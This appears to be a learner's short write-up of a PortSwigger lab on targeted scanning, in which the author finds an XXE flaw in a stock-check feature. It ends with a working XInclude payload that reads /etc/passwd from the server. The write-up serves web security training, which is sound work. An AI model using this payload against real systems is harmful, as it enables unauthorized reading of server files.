# Practitioner 158:  Discovering vulnerabilities quickly with targeted scanning

---

This lab contains a vulnerability that enables you to read arbitrary files from the server. To solve the lab, retrieve the contents of `/etc/passwd` within 10 minutes.

Due to the tight time limit, we recommend using [Burp Scanner](https://portswigger.net/burp/vulnerability-scanner) to help you. You can obviously scan the entire site to identify the vulnerability, but this might not leave you enough time to solve the lab. Instead, use your intuition to identify endpoints that are likely to be vulnerable, then try running a [targeted scan on a specific request](https://portswigger.net/web-security/essential-skills/using-burp-scanner-during-manual-testing#scanning-a-specific-request). Once Burp Scanner has identified an attack vector, you can use your own expertise to find a way to exploit it.

I started by looking around at the functionality of the website. I found the stock option which then drive me into seeing if It was vulnerable.

It was vulnerable to XXE which i then was able to play with it to get the /etc/paswd 

![Untitled](Practitioner%20158%20Discovering%20vulnerabilities%20quick%202a16005c73254929a8105458a3944038/Untitled.png)

![Untitled](Practitioner%20158%20Discovering%20vulnerabilities%20quick%202a16005c73254929a8105458a3944038/Untitled%201.png)

```
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo>
```